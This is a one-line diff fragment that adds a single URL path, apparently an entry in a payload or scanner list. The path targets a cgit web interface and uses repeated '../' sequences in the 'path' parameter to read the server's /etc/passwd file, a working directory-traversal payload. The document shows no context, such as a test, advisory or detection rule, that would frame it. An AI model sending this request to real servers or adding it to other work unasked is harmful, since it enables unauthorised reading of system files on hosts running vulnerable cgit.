@@ -1,0 +1,1 @@
+/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd
